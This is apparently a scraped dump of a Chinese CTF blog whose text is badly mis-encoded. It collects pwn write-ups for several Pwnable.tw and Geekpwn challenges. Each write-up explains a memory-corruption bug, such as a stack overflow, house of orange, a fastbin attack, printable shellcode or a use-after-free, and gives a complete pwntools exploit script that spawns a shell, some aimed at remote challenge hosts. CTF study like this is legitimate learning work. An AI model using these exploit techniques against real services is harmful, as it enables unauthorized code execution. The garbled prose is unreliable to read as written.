ä¹‹åä¸€æ¬¡å¶ç„¶çš„å°è¯•åœ¨å¾—åˆ°passwordåç”±äºæˆ‘åˆå¤šè¾“å…¥â€™aâ€™*0x50ï¼Œåœ¨copyæ‰§è¡Œstrcpyä¹‹åè¿”å›ä¸»å‡½æ•°å‘ç°passwordè¢«æ”¹ä¸ºâ€™aâ€™äº†ï¼ï¼ï¼ ä»”ç»†è°ƒè¯•åœ¨æ±‡ç¼–é‡Œå‘ç°é—®é¢˜ï¼š 12345678910loginå‡½æ•°çš„æ ˆå¸§ï¼š.text:0000000000000DEF push rbp.text:0000000000000DF0 mov rbp, rsp.text:0000000000000DF3 sub rsp, 90hcopyå‡½æ•°çš„æ ˆå¸§ï¼š.text:0000000000000E76 push rbp.text:0000000000000E77 mov rbp, rsp.text:0000000000000E7A sub rsp, 90h ä¸»è°ƒç”¨å‡½æ•°éƒ½æ˜¯mainå‡½æ•°ï¼Œè¿™æ„å‘³ç€login()å’Œcopy()å‡½æ•°æ˜¯å…¬ç”¨ä¸€ä¸ªæ ˆçš„ï¼ï¼ï¼ï¼ è¿™æ ·å°±èƒ½è§£é‡Šé€šäº†ï¼Œåœ¨login()é‡Œè¾“å…¥çš„â€™aâ€™ä¼šæ®‹å­˜åœ¨æ ˆé‡Œï¼Œå½“copy()å†æ¬¡ç”¨åˆ°è¿™éƒ¨åˆ†æ ˆæ˜¯ï¼Œæœ¬æ˜¯æƒ³åˆ©ç”¨read_n((unsigned __int8 *)&amp;src, 0x3Fu);æœ€å¤šè¾“å…¥0x3fé‚£æœ€åä¸€ä¸ªå°±æ˜¯â€™\\x00â€™æ¥æˆªæ–­ï¼Œä½†å®é™…ä¸Šæ ˆé‡Œè¯¥å¤„çš„ä½ç½®å·²ç»è¢«å†™å…¥äº†â€™aâ€™ï¼Œå¯å¯¼è‡´åœ¨strcpyæ—¶mainå‡½æ•°çš„æ ˆæº¢å‡ºã€‚ æ€è·¯æœ‰äº†ï¼Œä½†æ²¡åœ°å€ï¼Œè‚¯å®šæœ‰åŠæ³•æ³„éœ²çš„ã€‚ æƒ³åˆ°passwordæ˜¯é€šè¿‡strncmpçš„æ¯”è¾ƒæ¥è·å¾—çš„ï¼Œä¸”æ¯”è¾ƒçš„é•¿åº¦å¯æ§ï¼Œé‚£æˆ‘ä»¬ä¹Ÿèƒ½ç”¨ç›¸åŒçš„åŠæ³•æ³„éœ²å‡ºstacké‡Œçš„åœ°å€ã€‚ è¿™é‡Œæˆ‘çš„æ€è·¯çš„loginæ—¶è¾“å…¥â€™\\x00â€™+â€™1â€™*87ï¼Œè¿™æ ·æ—¢èƒ½loginæˆåŠŸåˆèƒ½æ”¹passwordä¸ºâ€™1â€™*0x10ï¼Œä½†ä¸ºä»€ä¹ˆæ˜¯87ä¸ªå‘¢ï¼Œä¸€æ–¹é¢æ˜¯ä¸ºäº†strcpyæ”¹passwordï¼Œå¦ä¸€ä¸ªæ˜¯ç”±äºåœ¨è¾“å…¥è¿™ä¹ˆå¤šçš„é•¿åº¦æ—¶ï¼Œmainå‡½æ•°stacké‡Œçš„passwoed(è¢«æ”¹äº†çš„)åé¢ä¼šå†™å…¥stdvbufçš„åœ°å€ï¼ï¼ˆè‡³äºä¸ºä»€ä¹ˆä¼šå†™å…¥è¿™ä¸ªåœ°å€ï¼Œä¸ªäººæƒ³æ³•å¯èƒ½æ—¶æ‰§è¡Œäº†å¯¹è¾“å…¥æµåˆå§‹ç›¸å…³çš„æ“ä½œï¼Œè¿˜æœ‰å¾…ç ”ç©¶ï¼‰ï¼Œé‚£è¿™æ ·çš„è¯å°±èƒ½é€šè¿‡å†æ¬¡loginæ¥leakå‡ºLibcåœ°å€ã€‚ 12345678910pwndbg&gt; stack 5000:0000â”‚ rsp 0x7ffd0e102f00 â—‚â€” 0x6161616161616161 ('aaaaaaaa')... â†“07:0038â”‚ 0x7ffd0e102f38 â—‚â€” 0x3161616161616161 ('aaaaaaa1')08:0040â”‚ 0x7ffd0e102f40 â—‚â€” 0x3131313131313131 ('11111111') //password... â†“0a:0050â”‚ rsi 0x7ffd0e102f50 â—‚â€” 0x3131313131310a31 ('1\\n111111')0b:0058â”‚ 0x7ffd0e102f58 â€”â–¸ 0x7fdc09940fb4 (setvbuf+324) â—‚â€” 0xfc085480b8bd2310c:0060â”‚ rbp 0x7ffd0e102f60 â€”â–¸ 0x5555a2d50060 â—‚â€” 0x41ff8941564157410d:0068â”‚ 0x7ffd0e102f68 â€”â–¸ 0x7fdc098f1830 (__libc_start_main+240) â—‚ å¦‚æœåªæ˜¯æ”¹passwordï¼Œè€Œæ²¡å‘ä¸‹ç»§ç»­è¦†ç›–çš„è¯æ˜¯è¿™æ ·çš„ï¼š 123456789pwndbg&gt; stack 5000:0000â”‚ rsp 0x7ffc3b4fb510 â—‚â€” 0x6161616161616161 ('aaaaaaaa')... â†“07:0038â”‚ 0x7ffc3b4fb548 â—‚â€” 0x3161616161616161 ('aaaaaaa1')08:0040â”‚ 0x7ffc3b4fb550 â—‚â€” 0x3131313131313131 ('11111111')... â†“0a:0050â”‚ rsi 0x7ffc3b4fb560 â—‚â€” 0x7fac80980a310b:0058â”‚ 0x7ffc3b4fb568 â—‚â€” 0x00c:0060â”‚ rbp 0x7ffc3b4fb570 â€”â–¸ 0x55c28958a060 â—‚â€” 0x41ff894156415741 0x7fac80980a31è¿™ä¸ªåœ°å€çœ‹ç€åƒLibcé‡Œçš„ï¼Œä½†å®é™…ä¸Šä»–å’ŒLibcçš„åç§»æ˜¯ä¸å›ºå®šçš„ã€‚ ä¸‡äº‹å…·å¤‡äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨loginæ—¶æ„é€ å¥½stackï¼Œåœ¨copyé‡Œæ‰§è¡Œstrcpyæ—¶å°†æ­£ç¡®çš„passwordå†™å…¥å¯¹åº”ä½ç½®ï¼ˆé€€å‡ºæ—¶ä¼šå’Œbssä¸Šå¤‡ä»½çš„æ¯”è¾ƒï¼‰ï¼Œå¹¶æ”¹ret_addrä¸ºone_gadgetğŸš© EXP: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def get_password(len, flag=False): secret=&quot;&quot; for i in range(len): for j in range(0x1,0x100): if flag is True and j == 0x10: continue p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Your passowrd :&quot;) temp = secret+chr(j)+&quot;\\x00&quot; p.sendline(temp) recv = p.recvuntil(&quot;\\n&quot;) if &quot;Success&quot; in recv: secret += chr(j) log.success(&quot;password: &quot;+secret) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(&quot;1&quot;) break return secretdef main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./babystack&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./libc_64.so.6&quot;}) secret=get_password(0x10) # debug(0x000000FA6) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.send('\\x00'+'1'*(47+32)) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline('3') p.recvuntil(&quot;:&quot;) p.send('a'*0x3f) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline('1') guess='1'*0x11+'\\n'+'1'*6 for _ in range(0x6): for i in range(0x1,0x100): p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.send(guess+chr(i)+'\\x00') recv=p.recvuntil(&quot;\\n&quot;) if 'Success' in recv: guess+=chr(i) success(&quot;guess: &quot;+guess) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) break libc.address=u64(guess[24:].ljust(8,'\\x00'))-0x06ffb4 success(&quot;libc: &quot;+hex(libc.address)) one_gadget=libc.address+0xf0567 p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.send('\\x00'+'a'*0x3f+secret+'a'*0x18+p64(one_gadget)) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(3)) p.recvuntil(&quot;:&quot;) p.send('a'*0x3f) # gdb.attach(p) p.recvuntil(&quot;&gt;&gt; &quot;) p.sendline(str(2)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc_64.so.6&quot;) main(0)","link":"/2020/10/20/Pwnable_babystack/"},{"title":"Geekpwn","text":"0x01paperpointerå…ˆä»‹ç»ä¸‹æœ¬é¢˜çš„åˆ©ç”¨æ‰‹æ³•:house of orange å‰æï¼šéœ€è¦æœ‰è¾ƒå¤§èŒƒå›´å†…çš„å †æº¢å‡º,å¹¶æ³„éœ²libcåŸºå€ã€‚ 1ã€åˆ é™¤ä¸€ä¸ªå †å—è‡³unsorted binï¼Œå¹¶ä¿®æ”¹è¯¥chunkçš„bkä¸º_IO_list_all-0x10ã€‚ å‚è€ƒæºç ï¼š 1234567891011while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) { bck = victim-&gt;bk; [...] /* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av); if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, chunk2mem (victim), av);//æ”»å‡»å¼€å§‹å‡½æ•° } å¯ä»¥çœ‹åˆ°å½“remove from unsorted listæ—¶ï¼Œbck=_IO_list_all-0x10ï¼Œunsorted_chunks(av)=main_arean+88 å› æ­¤èµ‹å€¼æ˜¯ä¼šå‘ç”Ÿï¼š main_arean+88+0x18=_IO_list_all-0x10 _IO_list_all-0x10+0x10=main_arean+88 è¯´æ˜ï¼šè¿›ç¨‹å†…æ‰€æœ‰çš„_IO_FILE ç»“æ„ä¼šä½¿ç”¨_chain åŸŸç›¸äº’è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œè¿™ä¸ªé“¾è¡¨çš„å¤´éƒ¨ç”±_IO_list_all ç»´æŠ¤ï¼Œå…¶ä¸€èˆ¬æŒ‡å‘IO_2_1_stderr æ‰€ä»¥ç­‰åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œå°±ä¼šä» _IO_2_1_stderr*æ”¹å˜å» arena é‡Œã€‚ 2ã€ä¿®æ”¹è¯¥unsorted binçš„pre+sizeä¸ºâ€™/bin/shâ€™,sizeä¸º0x61ã€‚ å‚è€ƒæºç ï¼š 12345678910/* place chunk in bin */ if (in_smallbin_range(size)) { victim_index = smallbin_index(size); bck = bin_at(av, victim_index); fwd = bck-&gt;fd; [...] victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; ç”±äºæˆ‘ä»¬ä¼ªé€ çš„sizeä¸º0x61ï¼Œæ‰€ä»¥ä¼šè¿›å…¥small binï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„èµ‹å€¼æ“ä½œä¸ºï¼š fwd-&gt;bk=victim å³ï¼šmain_arean+88+0x60+0x18=victim(chunkåœ°å€) è€Œåœ¨IO_fileçš„ç»“æ„ä½“ä¸­,offsetä¸º0x78å¤„æ­£å¥½ä¸º_chain æŒ‡é’ˆ,æ‰€ä»¥è‹¥æ˜¯åœ¨ arena é‡Œçš„fileæµè¦è·³è½¬ï¼Œå°±ä¼šè·³è½¬åˆ°åŸchunké‡Œ è¯´æ˜ï¼šstruct _IO_FILE _chain;/æŒ‡å‘ä¸‹ä¸€ä¸ªfileç»“æ„/ 3ã€ä¼ªé€ fileé‡Œçš„æ•°æ®ç»•è¿‡æ£€æŸ¥ã€‚ _mode &lt;= 0_IO_write_ptr &gt;_IO_write_baseæˆ–_IO_vtable_offset (fp) == 0ï¼ˆæ— æ³•å˜åŠ¨ï¼‰_mode &gt; 0_wide_data-&gt;_IO_write_ptr &gt; wide_data-&gt;_IO_write_base exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./pwn&quot;)else: p=remote(&quot;183.60.136.230&quot;,16145)def cmd(command): p.recvuntil(&quot;your choice:&quot;) p.sendline(str(command))def edit(offset,sz,content): cmd(1) p.recvuntil(&quot;:&quot;) p.sendline(str(offset)) p.recvuntil(&quot;:&quot;) p.sendline(str(sz)) p.recvuntil(&quot;:&quot;) p.send(content)def dele(offset): cmd(2) p.recvuntil(&quot;:&quot;) p.sendline(str(offset))def pwn(): p.recvuntil(&quot;0x&quot;) sleep=int(p.recv(3),16) byte=(sleep&lt;&lt;8)+0xa00000 print hex(byte) edit(0x400,0x200,p64(0)+p64(0x141)+'a'*0x60+'\\x00'*(0x130-0x60)+p64(0)+p64(0x21)+'\\x00'*0x10+p64(0)+p64(0x21)) edit(0,0x100,p64(0)+p64(0x91)+'\\x00'*0x80+(p64(0)+p64(0x21))*3) edit(0xc0,0x200,p64(0)+p64(0x91)+p64(0)*2+p64(0)+p64(0x91)+'\\x00'*0x30+(p64(0)+p64(0x21))*8) dele(0xd0) dele(0xf0) dele(0x410) cmd(3) edit(0xf8,3,p64(byte-0x86e60-0x10)) dele(0x10) edit(0x18,3,p64(byte+0x2f9310)) edit(0,16,'/bin/sh\\x00'+p64(0x61)) edit(0x20,16,p64(2)+p64(3)) cmd(4) gdb.attach(p) p.interactive()if __name__ == &quot;__main__&quot; : pwn() 0x02babypwnåˆ©ç”¨show()è´Ÿæ•°æ³„éœ²libcï¼Œåˆ©ç”¨malloc(0)å®ç°å †æº¢å‡ºï¼ˆ0-1ä¸ºæœ€å¤§æ— ç¬¦å·æ•´å½¢ï¼‰ åˆ©ç”¨æ€è·¯ï¼š fastbin attcakåœ¨top_chunké™„è¿‘è¸©å‡ºåˆé€‚sizeã€‚ ä¿®æ”¹top_chunkè‡³__free_hooké™„è¿‘ã€‚ è¦†ç›–__free_hookä¸ºsystemã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./pwn&quot;) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)else: passdef cmd(command): p.recvuntil(&quot;:&quot;) p.sendline(str(command))def add(name,sz,content): cmd(1) p.recvuntil(&quot;:&quot;) p.send(str(name)) p.recvuntil(&quot;:&quot;) p.sendline(str(sz)) p.recvuntil(&quot;:&quot;) p.send(content)def dele(idx): cmd(2) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil(&quot;:&quot;) p.sendline(str(idx))def pwn(): show(-5) p.recvuntil(&quot;name:&quot;) libc.address=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,'\\x00'))-0x3c5710 success(&quot;libc : &quot;+hex(libc.address)) add(&quot;oooo\\n&quot;,0x10,&quot;oooo\\n&quot;) #0 add(&quot;oooo\\n&quot;,0x30,&quot;oooo\\n&quot;) dele(0) dele(1) add(&quot;oooo\\n&quot;,0,p64(0)*3+p64(0x41)+p64(0x51)+&quot;\\n&quot;) add(&quot;oooo\\n&quot;,0x30,&quot;oooo\\n&quot;) #1 add(&quot;oooo\\n&quot;,0x10,&quot;oooo\\n&quot;) #2 add(&quot;oooo\\n&quot;,0x40,&quot;oooo\\n&quot;) #3 dele(2) dele(3) add(&quot;oooo\\n&quot;,0,p64(0)*3+p64(0x51)+p64(libc.address+0x3c4b30)+'\\n') #2 add(&quot;oooo\\n&quot;,0x40,&quot;/bin/sh\\n&quot;) #3 add(&quot;oooo\\n&quot;,0x40,&quot;\\x00&quot;*0x38+p64(libc.address+0x3c5c50)[:6]+'\\n') # 4 add(&quot;oooo\\n&quot;,0,p64(0)*3+p64(0xffffffffffff)+&quot;\\x00&quot;*0xb28+p64(libc.sym['system'])+'\\n') dele(3)# print hex(libc.sym['__free_hook']) gdb.attach(p) p.interactive()if __name__== '__main__': pwn()","link":"/2020/07/18/Geekpwn/"},{"title":"Pwnable.tw death_note","text":"Pwnable.tw death_note printable shellocode è¿™é¢˜è¿˜ç®—ç®€å•ï¼Œaddæ—¶idxæ£€æŸ¥ä¸ä¸¥å¯¼è‡´å¯ä»¥å‘ä¸Šå†™gotè¡¨ï¼ŒåŒæ—¶NXæ²¡å¼€ï¼Œå› æ­¤æˆ‘ä»¬å…ˆåœ¨heapé‡Œå†™shellcodeï¼Œä¹‹åæ”¹puts_gotæ‰§è¡Œshellcodeã€‚ ä½†é¢˜ç›®å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†é™åˆ¶ï¼š 1234567891011int __cdecl is_printable(char *s){ size_t i; // [esp+Ch] [ebp-Ch] for ( i = 0; strlen(s) &gt; i; ++i ) { if ( s[i] &lt;= 0x1F || s[i] == 0x7F ) return 0; } return 1;} å› æ­¤æˆ‘ä»¬æ„é€ çš„shellcodeè¦ç¬¦åˆæ¡ä»¶ï¼Œä¹Ÿå³å¯æ‰“å°çš„shellcodeã€‚ ç”±äºé™åˆ¶ï¼ŒmovæŒ‡ä»¤æ— æ³•ä½¿ç”¨äº†ï¼Œä½†å¯ä»¥é€šè¿‡push,popæ¥æ›¿ä»£ã€‚æœ€è‡´å‘½çš„æ—¶â€™int 0x80â€™æ²¡äº†ğŸ˜± çœ‹äº†P4ndaå¸ˆå‚…çš„åšå®¢ï¼Œå­¦åˆ°äº†è¿˜å¯ä»¥ç”¨sub byte ptr[eax + 0x35] , dl;sub byte ptr[eax + 0x34] , dlè¿™æ ·çš„æ‰§è¡Œå¯¹æœºå™¨ç è¿›è¡Œä¿®æ”¹ã€‚ ç”±äºint 0x80çš„æœºå™¨ç ä¸º cd 80 (16è¿›åˆ¶)ï¼Œåˆ‡åœ¨shellcodeå¼€å§‹æ‰§è¡Œæ—¶edxå­˜æ”¾shellcodeé¦–åœ°å€ï¼Œå› æ­¤æ„é€ eax=shellcode_addr,dl=0x60,ä¹‹åå†ptr[eax + 0x35]å³shellcodeç»“å°¾å¤„å†™å…¥â€™\\x6b\\x40â€™ï¼Œé€šè¿‡æ‰§è¡Œæ”¹æŒ‡ä»¤å¯ä»¥ä¿®æ­£ä½¿å…¶ä¸º0xcdå’Œ0x80ï¼Œå¤ªå¦™äº†ã€‚ å¦å¤–eax=0xbå¯ä»¥é€šè¿‡xoræŒ‡ä»¤å®ç°ã€‚ EXP: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level='debug'def main(host,port=10201): global p if host: p=remote(host,port) else: p=process(&quot;./death_note&quot;) #eax=0xb,ebx=&quot;/bin/sh&quot;,ecx=edx=0 shellcode=''' push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl push ecx pop edx push edx pop eax xor al, 0x40 xor al, 0x4b push edx pop edx push edx pop edx ''' # gdb.attach(p,'b*0x80487EF') offset=-16 p.recvuntil(&quot;:&quot;) p.sendline(str(1)) p.recvuntil(&quot;:&quot;) p.sendline(str(offset)) p.recvuntil(&quot;:&quot;) p.send(asm(shellcode)+'\\x6b\\x40') p.interactive()if __name__ == '__main__': main(&quot;chall.pwnable.tw&quot;) å‚è€ƒåšæ–‡ï¼š(http://p4nda.top/2017/09/29/pwnable-tw-deathnote/)","link":"/2020/10/15/Pwnable_death_note/"},{"title":"Pwnable.tw dubblesort","text":"Pwnable.tw dubblesort æœ€è¿‘æ€»æ˜¯æƒ³å†™ç‚¹ä¸œè¥¿ï¼Œæƒ³æ¥æƒ³å»è¿˜æ˜¯pwnable.twä¸Šçš„é¢˜ç›®å€¼å¾—è®°å½•ï¼Œå› æ­¤å‡†å¤‡å†™ä¸ªseriesï¼Œå°±ä»200åˆ†çš„dubblesortå¼€å§‹å§ğŸ˜ 32ä½çš„ç¨‹åºï¼Œé¢˜ç›®åæ˜¯dubblesortå†’æ³¡æ’åºï¼Œå…ˆåˆ†æä¸€æ³¢ï¼š 123__printf_chk(1, (int)&quot;What your name :&quot;); read(0, &amp;buf, 0x40u); __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;); å¼€å§‹çš„nameè¾“å…¥åˆ°stackä¸Šï¼Œreadæ²¡æœ‰â€™\\0â€™æˆªæ–­ï¼Œå› æ­¤å¯ç”¨æ¥æ³„éœ²æ ˆé‡Œçš„æ•°æ®ï¼Œå¤šä¸ºlibcã€‚ ä¹‹åç¨‹åºè®©æˆ‘ä»¬è¾“å…¥sort numberå’Œnumber,è¿™äº›æ•°æ®éƒ½æ˜¯å­˜æ”¾åœ¨stackä¸Šçš„,ç„¶åæ‰§è¡Œsort()å‡½æ•°è¿›è¡Œå†’æ³¡æ’åºã€‚ 1234567891011121314151617181920__printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);__isoc99_scanf(&quot;%u&quot;, &amp;v9);count = v9;if ( v9 ){ v4 = &amp;nums; v5 = 0; do { __printf_chk(1, (int)&quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, v4); ++v5; count = v9; ++v4; } while ( v9 &gt; v5 );}sort((unsigned int *)&amp;nums, count);puts(&quot;Result :&quot;); ç”±äºè¾“å…¥çš„æ•°é‡ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œé‚£å°±å¯ä»¥æ ˆæº¢å‡ºäº†ï¼Œéš¾ç‚¹åœ¨äºç¨‹åºå¼€å¯äº†canaryï¼Œå› æ­¤æˆ‘ä»¬è¦åšçš„å°±æ˜¯å¦‚ä½•èƒ½å¤Ÿä¸æ”¹æ‰canaryåŒæ—¶è¦†ç›–è¿”å›åœ°å€ï¼Œå¹¶ä¸”åœ¨sort()åè¿™äº›æ•°æ®è¿˜èƒ½å†å¯¹åº”çš„ä½ç½®ä¸Š(å¯èƒ½å› ä¸ºå¤§å°é—®é¢˜è€Œè¢«äº¤æ¢ä¹‹ç±»çš„)ğŸ“ åœ¨æ‰§è¡Œ__isoc99_scanf(â€œ%uâ€, v4);æ—¶ï¼Œå½“æˆ‘å°è¯•è¾“å…¥ä¸€äº›éæ³•çš„å­—ç¬¦å¦‚â€™#â€™ï¼Œç”±äºâ€%uâ€è¡¨ç¤ºæ¥æ”¶æ•°æ®æ ¼å¼ä¸ºæ— ç¬¦å·çš„æ•´å½¢ï¼Œå› æ­¤è§†â€™#â€™ä¸ºéæ³•çš„å­—ç¬¦ï¼Œä»è€Œscanfæ‰§è¡Œå¤±è´¥ï¼Œæ ˆä¸Šå¯¹åº”çš„æ•°æ®æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œä½†ä¹Ÿå¯¼è‡´å®ƒç•™åœ¨äº†stdiné‡Œä½¿å¾—åé¢å¾ªç¯çš„scanfä¹Ÿæ— æ³•æ­£ç¡®æ‰§è¡Œï¼Œé‚£æœ‰æ²¡æœ‰ä»€ä¹ˆå­—ç¬¦å¯ä»¥ä½¿å¾—scanfè§†å…¶ä¸ºåˆæ³•å­—ç¬¦å´ä¸ä¿®æ”¹stackçš„æ•°æ®å‘¢? ç½‘ä¸ŠæŸ¥æ‰¾ä¸€ç•ªäº†è§£åˆ°â€™+â€™å’Œâ€™-â€˜å¯ä»¥ğŸ‰ã€‚åŸå› åœ¨äºè¿™ä¸¤ä¸ªç¬¦å·ç”¨äºå®šä¹‰æ­£æ•°å’Œè´Ÿæ•°ï¼Œå½“è¾“å…¥+4æ—¶ä¼šè§†ä¸º4ï¼Œ-4ä¼šè§†ä¸ºæ— ç¬¦å·çš„0x100000000-4,å› æ­¤å½“æˆ‘ä»¬åªè¾“å…¥â€™+â€™æ—¶ï¼Œç”±äºæˆ‘ä»¬å®é™…ä¸Šä»€ä¹ˆä¹Ÿæ²¡è¾“å…¥ï¼Œè‡ªç„¶ä¹Ÿå°±ä¸ä¼šæ”¹å†™stackä¸Šçš„æ•°æ®ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨canaryå‰å†™å…¥â€™0â€™,canaryå¤„å†™å…¥â€™+â€™,cananryåé¢åˆ°ebpå†™str(0xf0000000)ï¼Œret_addrå†™systemï¼Œç„¶åå†™ä¸¤ä¸ªlibcä¸­â€™/bin/shâ€™çš„åœ°å€ï¼Œè¿™æ ·æ„é€ çš„è¯sort()å®Œå…¶ä½ç½®å°†ä¸ä¼šå› äº¤æ¢è€Œæ”¹å˜ï¼ˆæ²¡æœ‰å‘ç”Ÿäº¤æ¢ï¼‰ï¼Œä»è€Œèƒ½æ‹¿åˆ°flagğŸš© EXP: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *DEBUG=0context.log_level='debug'if DEBUG: # r=process(&quot;./dubblesort&quot;,env={&quot;LD_PRELOAD&quot;:&quot;../libc_32.so.6&quot;}) p=process(&quot;./dubblesort&quot;) libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: p=remote(&quot;chall.pwnable.tw&quot;,10101) libc=ELF(&quot;../libc_32.so.6&quot;)# gdb.attach(p)# pause()got_plt_offset = 0x1b0000# leak libc addresspayload_1 = &quot;a&quot;*24p.recv()p.sendline(payload_1)libc_addr = u32(p.recv()[30:34])-0xalibc_address = libc_addr - got_plt_offset# libc_address=u32(p.recv(4))-0x1b3061info(&quot;libc: &quot;+hex(libc_address))# p.recvuntil('sort :')p.sendline(str(35))for _ in range(24): p.recvuntil(&quot;number : &quot;) p.sendline(str(0))p.recvuntil(&quot;number : &quot;)p.sendline('+')for _ in range(7): p.recvuntil(&quot;number : &quot;) p.sendline(str(0xf0000000))# gdb.attach(p)p.recvuntil(&quot;number : &quot;)p.sendline(str(libc.sym['system']+libc_address))p.recvuntil(&quot;number : &quot;)# p.sendline(str(libc.sym['system']+libc_address+1))p.sendline(str(libc_address+libc.search('/bin/sh').next()))p.recvuntil(&quot;number : &quot;)p.sendline(str(libc_address+libc.search('/bin/sh').next()))p.interactive()","link":"/2020/10/14/Pwnable_dubblesort/"},{"title":"Pwnable.tw hacknote","text":"Pwnable.tw hacknote ç®€å•èœå•é¢˜ï¼Œæä¾›äº†ä¸€ç§åˆ©ç”¨æ€è·¯ ç¨‹åºçš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äºåœ¨mallocæ–°å †ä¹‹å‰ä¼šå…ˆmalloc(8)ï¼ˆæˆ‘å°±ç§°å®ƒä¸ºleadï¼‰è¿‡æ¥å­˜æ”¾putsçš„å‡½æ•°æŒ‡é’ˆå’Œè§£ä¸‹æ¥mallocå¾—åˆ°çš„ptr show()å‡½æ•°åˆ™æ˜¯é€šè¿‡è°ƒç”¨è¯¥ä½ç½®çš„å‡½æ•°æŒ‡é’ˆæ¥è¿›è¡Œæ‰“å° 12345678910printf(&quot;Index :&quot;);read(0, &amp;buf, 4u);v1 = atoi(&amp;buf);if ( v1 &lt; 0 || v1 &gt;= numbers ){ puts(&quot;Out of bound!&quot;); _exit(0);}if ( ptr[v1] ) (*ptr[v1])(ptr[v1]); æ˜¾è€Œæ˜“è§ï¼Œåªè¦ä¿®æ”¹å­˜åœ¨ä¸å †ä¸Šçš„å‡½æ•°æŒ‡é’ˆä¸ºsystemï¼Œå†showå³å¯å®Œæˆåˆ©ç”¨ã€‚ç¨‹åºè¿˜å­˜åœ¨UAFï¼Œå¯¹æˆ‘ä»¬æ¥è¯´æ˜¯ä¸ªå¥½æ¶ˆæ¯ã€‚ å…ˆåˆ©ç”¨å †åˆ†é…å¾—åˆ°chunk0å¯¹åº”çš„leadï¼Œæ”¹heap_pträ¸ºprintf_gotï¼Œshow(0)å¾—åˆ°libcåœ°å€ï¼Œç„¶ååŒæ ·æ–¹æ³•å¾—åˆ°leadï¼Œæ”¹putsçš„å‡½æ•°æŒ‡é’ˆä¸ºsystem,heap_pträ¸ºâ€||shâ€,â€™||â€™ç”¨æ¥äºå®Œæˆå‚æ•°çš„æˆªæ–­ï¼Œä¹‹åshowæ‹¿åˆ°shellğŸš© 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level='debug'DEBUG=1if DEBUG: r=process(&quot;./hacknote&quot;) libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: r=remote(&quot;chall.pwnable.tw&quot;,10102) libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)elf=ELF(&quot;./hacknote&quot;)def add(sz,content): r.recvuntil(&quot;Your choice :&quot;) r.sendline('1') r.recvuntil(&quot;Note size :&quot;) r.sendline(str(sz)) r.recvuntil(&quot;Content :&quot;) r.send(content)def dele(idx): r.recvuntil(&quot;Your choice :&quot;) r.sendline('2') r.recvuntil(&quot;Index :&quot;) r.sendline(str(idx))def show(idx): r.recvuntil(&quot;Your choice :&quot;) r.sendline('3') r.recvuntil(&quot;Index :&quot;) r.sendline(str(idx))def pwn(): add(0x18,'a'*8) add(0x18,'a'*8) add(0x18,'a'*8) dele(0) dele(1) add(0x8,p32(0x0804862B)+p32(elf.got['printf'])) gdb.attach(r) show(0) libc_address=u32(r.recv(4))-libc.sym['printf'] system=libc_address+libc.sym['system'] binsh=libc_address+libc.search(&quot;/bin/sh&quot;).next() dele(2) dele(3) add(0x8,p32(system)+'||sh') show(0) r.interactive()if __name__ == '__main__': pwn() 